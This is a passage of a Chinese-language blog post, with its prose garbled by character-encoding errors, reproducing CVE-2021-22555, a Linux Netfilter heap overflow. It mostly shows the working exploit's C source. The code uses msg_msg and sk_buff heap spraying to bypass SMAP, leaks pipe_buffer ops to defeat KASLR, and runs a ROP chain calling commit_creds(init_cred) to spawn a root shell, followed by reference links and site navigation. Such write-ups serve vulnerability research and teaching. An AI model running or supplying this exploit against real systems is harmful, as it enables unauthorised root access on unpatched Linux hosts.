class="keyword">goto</span> err_no_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake_idx&#x27;s primary message has a corrupted next pointer; wrongly pointing to real_idx&#x27;s secondary message.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] fake_idx: 0x%x\n&quot;</span>, fake_idx);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] real_idx: 0x%x\n&quot;</span>, real_idx);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 2: SMAP bypass\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">// 2. leak secondary msg address (kmalloc-0x400) -&gt; to forge `msg_msg-&gt;m_list-&gt;next &amp; prev`</span></span><br><span class="line"><span class="comment">// 2-1. free overlapped msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing real secondary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read_msg(msqid[real_idx], &amp;msg_secondary, <span class="keyword">sizeof</span>(msg_secondary),</span><br><span class="line">               MTYPE_SECONDARY) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Reclaim the previously freed secondary message with a fake msg_msg of maximum possible size.</span></span><br><span class="line"><span class="comment">// 2-2. spray and forge msg_msg (forge larger msg_msg-&gt;m_ts)</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, <span class="number">0x41414141</span>, <span class="number">0x42424242</span>,</span><br><span class="line">                PAGE_SIZE - MSG_MSG_SIZE, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 2-2. leak heap pointer `msg_msg-&gt;m_list-&gt;prev` (kmalloc-0x1000)</span></span><br><span class="line">  <span class="comment">// Use the fake secondary message to read out-of-bounds.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking adjacent secondary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (peek_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if the leak is valid.</span></span><br><span class="line">  <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_fake.mtext[SECONDARY_SIZE] != MSG_TAG) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not leak adjacent secondary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The secondary message contains a pointer to the primary message.</span></span><br><span class="line">  msg = (struct msg_msg *)&amp;msg_fake.mtext[SECONDARY_SIZE - MSG_MSG_SIZE];</span><br><span class="line">  kheap_addr = msg-&gt;m_list_next;</span><br><span class="line">  <span class="keyword">if</span> (kheap_addr &amp; (PRIMARY_SIZE - <span class="number">1</span>))</span><br><span class="line">    kheap_addr = msg-&gt;m_list_prev;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kheap_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kheap_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kheap_addr &amp; <span class="number">0xFFFF000000000000</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel heap address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 2-3. leak heap pointer `msg_msg-&gt;m_list-&gt;prev` (kmalloc-0x400)  (forge msg_msg-&gt;next)</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing fake secondary messages...\n&quot;</span>);</span><br><span class="line">  free_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Put kheap_addr at next to leak its content. Assumes zero bytes before</span></span><br><span class="line">  <span class="comment">// kheap_addr.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, <span class="number">0x41414141</span>, <span class="number">0x42424242</span>,</span><br><span class="line">                <span class="keyword">sizeof</span>(msg_fake.mtext), kheap_addr - MSG_MSGSEG_SIZE);      <span class="comment">// fist 8 bytes must be NULL</span></span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Use the fake secondary message to read from kheap_addr.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking primary message...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (peek_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Check if the leak is valid.</span></span><br><span class="line">  <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;msg_fake.mtext[PAGE_SIZE] != MSG_TAG) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error could not leak primary message.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// The primary message contains a pointer to the secondary message.</span></span><br><span class="line">  msg = (struct msg_msg *)&amp;msg_fake.mtext[PAGE_SIZE - MSG_MSG_SIZE];</span><br><span class="line">  kheap_addr = msg-&gt;m_list_next;</span><br><span class="line">  <span class="keyword">if</span> (kheap_addr &amp; (SECONDARY_SIZE - <span class="number">1</span>))</span><br><span class="line">    kheap_addr = msg-&gt;m_list_prev;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Calculate the address of the fake secondary message.</span></span><br><span class="line">  kheap_addr -= SECONDARY_SIZE;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kheap_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kheap_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kheap_addr &amp; <span class="number">0xFFFF00000000FFFF</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel heap address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 3. leak kernel base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 3: KASLR bypass\033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing fake secondary messages...\n&quot;</span>);</span><br><span class="line">  free_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3-1. forge `msg_msg-&gt;m_list-&gt;next &amp; prev` so that list_del() does not crash.</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake secondary messages...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line">  build_msg_msg((<span class="keyword">void</span> *)secondary_buf, kheap_addr, kheap_addr, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 3-2. free secondary msg</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Freeing sk_buff data buffer...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (read_msg(msqid[fake_idx], &amp;msg_fake, <span class="keyword">sizeof</span>(msg_fake), MTYPE_FAKE) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 3-3. spray pipe_buffer object</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (pipe(pipefd[i]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] pipe&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Write something to populate pipe_buffer.</span></span><br><span class="line">    <span class="keyword">if</span> (write(pipefd[i][<span class="number">1</span>], <span class="string">&quot;pwn&quot;</span>, <span class="number">3</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] write&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 3-4. leak pipe_buffer-&gt;ops â€”â€” kernel base</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Leaking and freeing pipe_buffer object...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_SOCKETS; i++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_SKBUFFS; j++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (read(ss[i][<span class="number">1</span>], secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] read&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_rmid;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (*(<span class="keyword">uint64_t</span> *)&amp;secondary_buf[<span class="number">0x10</span>] != MTYPE_FAKE)</span><br><span class="line">        pipe_buffer_ops = *(<span class="keyword">uint64_t</span> *)&amp;secondary_buf[<span class="number">0x10</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  kernel_offset = pipe_buffer_ops - ANON_PIPE_BUF_OPS;</span><br><span class="line">  kbase_addr = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] anon_pipe_buf_ops: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, pipe_buffer_ops);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] kbase_addr: 0x%&quot;</span> PRIx64 <span class="string">&quot;\n&quot;</span>, kbase_addr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((kbase_addr &amp; <span class="number">0xFFFF0000000FFFFF</span>) != <span class="number">0xFFFF000000000000</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[-] Error kernel base address is incorrect.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">// 4. hijack control-flow</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] STAGE 4: Kernel code execution\033[0m\n&quot;</span>);</span><br><span class="line"><span class="comment">// 4-1. use skb to forge fake pipe_buffer</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Spraying fake pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(secondary_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_buf));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//hijack rsp</span></span><br><span class="line">  fake_pipe_buffer = (struct pipe_buffer *)&amp;secondary_buf;</span><br><span class="line">  fake_pipe_buffer-&gt;ops = kheap_addr;</span><br><span class="line">  </span><br><span class="line">  fake_pipe_buffer_ops = (struct pipe_buf_operations *)secondary_buf;</span><br><span class="line">  fake_pipe_buffer_ops-&gt;release = kernel_offset + PUSH_RSI_JMP_RSI_0x2E;                  <span class="comment">//</span></span><br><span class="line">  fake_pipe_buffer_ops-&gt;confirm = kernel_offset + ADD_RSP_0x98_RET;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">uint64_t</span> *mid_gadget;</span><br><span class="line">  mid_gadget = (<span class="keyword">uint64_t</span>*) (<span class="keyword">uint64_t</span>*) &amp;secondary_buf[<span class="number">0x2e</span>];</span><br><span class="line">  mid_gadget[<span class="number">0</span>] = kernel_offset + POP_RSP_RET;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4-2. construct ROP chain</span></span><br><span class="line">  <span class="comment">//build rop</span></span><br><span class="line">    <span class="keyword">int</span> rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="keyword">uint64_t</span>*) &amp;secondary_buf[<span class="number">0xa0</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;PIG007XX&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="keyword">uint64_t</span>*) <span class="string">&quot;PIG007XX&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_eflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (spray_skbuff(ss, secondary_buf, <span class="keyword">sizeof</span>(secondary_buf)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> err_rmid;</span><br><span class="line"><span class="comment">// 4-3. trigger pipe_release()</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[*] Releasing pipe_buffer objects...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_PIPEFDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (close(pipefd[i][<span class="number">0</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] close&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (close(pipefd[i][<span class="number">1</span>]) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      perror(<span class="string">&quot;[-] close&quot;</span>);</span><br><span class="line">      <span class="keyword">goto</span> err_rmid;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">err_rmid:</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_MSQIDS; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (i == fake_idx)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (msgctl(msqid[i], IPC_RMID, <span class="literal">NULL</span>) &lt; <span class="number">0</span>)</span><br><span class="line">      perror(<span class="string">&quot;[-] msgctl&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">err_no_rmid:</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>æ•ˆæœï¼š</p>
<p>ä¸­é—´æœ‰ä¸ª<code>getchar()</code>ï¼ŒæŒ‰ä¸‹å›è½¦å³å¯ï¼Œæœ¬æ¥æ”¾è¿™æ˜¯ä¸ºäº†æ–¹ä¾¿è°ƒè¯•çš„ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220515143144038.png" alt="image-20220515143144038"></p>
<p>ä¸è¡Œçš„è¯å¯ä»¥å¤šå°è¯•å‡ æ¬¡</p>
<p>ç„¶åé€ƒé€¸å®¹å™¨çš„æˆ‘æ²¡å°è¯•ï¼Œä¹Ÿä¸å¤ªä¼šï¼Œå¯ä»¥å‚è€ƒ<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#FINAL-EXPLOIT" >arttnba3å¸ˆå‚…çš„å®¹å™¨é€ƒé€¸EXP</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="å‚è€ƒ"   >
          <a href="#å‚è€ƒ" class="heading-link"><i class="fas fa-link"></i></a><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/254027" >CVE-2021-22555 2å­—èŠ‚å †æº¢å‡ºå†™0æ¼æ´ææƒåˆ†æ - å®‰å…¨å®¢ï¼Œå®‰å…¨èµ„è®¯å¹³å° (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/#Final-EXPLOIT" >ã€CVE.0x07ã€‘CVE-2021-22555 æ¼æ´å¤ç°åŠç®€è¦åˆ†æ - arttnba3â€™s blog</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html" >CVE-2021-22555: Turning \x00\x00 into 10000$ | security-research (google.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>å¤ªå¤šäº†ï¼Œæœ‰ç‚¹è´´ä¸è¿‡æ¥äº†â€¦.</p>
</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="http://PIG-007.github.io">PIG-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="http://pig-007.github.io/2022/04/15/CVE-2021-22555_Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">http://pig-007.github.io/2022/04/15/CVE-2021-22555_Netfilter%E5%A0%86%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="http://pig-007.github.io/tags/Kernel-CVE/">Kernel_CVE</a></span></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2022/07/25/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">JAVAååºåˆ—åŒ–CCé“¾ç¬”è®°</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2022/03/07/arp_spoof/"><span class="paginator-prev__text">arp_spoof</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">
          ç¯å¢ƒæ­å»º</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%BA%E6%B3%A8%EF%BC%9A"><span class="toc-text">
          ğŸ”ºæ³¨ï¼š</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-text">
          å‰ç½®çŸ¥è¯†</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-msg-msg%E7%BB%93%E6%9E%84%E4%BD%93%E2%80%94kmalloc-16%E8%87%B3kmalloc-1024"><span class="toc-text">
          1.msg_msgç»“æ„ä½“â€”kmalloc-16è‡³kmalloc-1024</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-text">
          (1)ä½¿ç”¨æ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%9B%E5%BB%BA"><span class="toc-text">
          â‘ åˆ›å»º</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E6%95%B0%E6%8D%AE%E4%BC%A0%E8%BE%93"><span class="toc-text">
          â‘¡æ•°æ®ä¼ è¾“</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E9%87%8A%E6%94%BE"><span class="toc-text">
          â‘¢é‡Šæ”¾</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">
          æ€»ç»“</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E4%B8%8E%E9%87%8A%E6%94%BE"><span class="toc-text">
          (2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%9B%E5%BB%BA-1"><span class="toc-text">
          â‘ åˆ›å»º</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7"><span class="toc-text">
          A.å†…å­˜ç”³è¯·</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-text">
          ç›¸å…³å†…å­˜ç»“æ„ï¼š</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%94%B3%E8%AF%B7%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">
          å†…å­˜ç”³è¯·æ€»ç»“ï¼š</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6"><span class="toc-text">
          B.æ•°æ®å¤åˆ¶</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE"><span class="toc-text">
          â‘¡é‡Šæ”¾</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#A-%E9%9D%9E%E5%A0%86%E5%9D%97%E9%87%8A%E6%94%BE%E7%9A%84%E6%95%B0%E6%8D%AE%E8%AF%BB%E5%8F%96"><span class="toc-text">
          A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#B-%E9%87%8A%E6%94%BE%E5%A0%86%E5%9D%97%E7%9A%84%E6%B6%88%E6%81%AF%E8%AF%BB%E5%8F%96"><span class="toc-text">
          B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#C-%E6%95%B0%E6%8D%AE%E5%A4%8D%E5%88%B6"><span class="toc-text">
          C.æ•°æ®å¤åˆ¶</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8"><span class="toc-text">
          (3)åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%8F%96"><span class="toc-text">
          è¶Šç•Œè¯»å–</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E8%AF%BB%E5%8F%96"><span class="toc-text">
          ä»»æ„è¯»å–</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%86%99"><span class="toc-text">
          ä»»æ„å†™</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-pipe%E7%AE%A1%E9%81%93%E2%80%94kmalloc-1024-kmalloc-192"><span class="toc-text">
          2.pipeç®¡é“â€”kmalloc-1024&#x2F;kmalloc-192</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-1"><span class="toc-text">
          (1)ä½¿ç”¨æ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%9B%E5%BB%BA-2"><span class="toc-text">
          â‘ åˆ›å»º</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE-1"><span class="toc-text">
          â‘¡é‡Šæ”¾</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D%E4%B8%8E%E9%87%8A%E6%94%BE-1"><span class="toc-text">
          (2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%86%E9%85%8D"><span class="toc-text">
          â‘ åˆ†é…</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E9%87%8A%E6%94%BE-2"><span class="toc-text">
          â‘¡é‡Šæ”¾</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%88%A9%E7%94%A8-1"><span class="toc-text">
          (3)åˆ©ç”¨</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-text">
          â‘ ä¿¡æ¯æ³„éœ²</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81"><span class="toc-text">
          â‘¡åŠ«æŒç¨‹åºæµ</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-sk-buff%E2%80%94kmalloc-512%E5%8F%8A%E4%BB%A5%E4%B8%8A"><span class="toc-text">
          3.sk_buffâ€”kmalloc-512åŠä»¥ä¸Š</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95-2"><span class="toc-text">
          (1)ä½¿ç”¨æ–¹æ³•</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%9B%E5%BB%BA-3"><span class="toc-text">
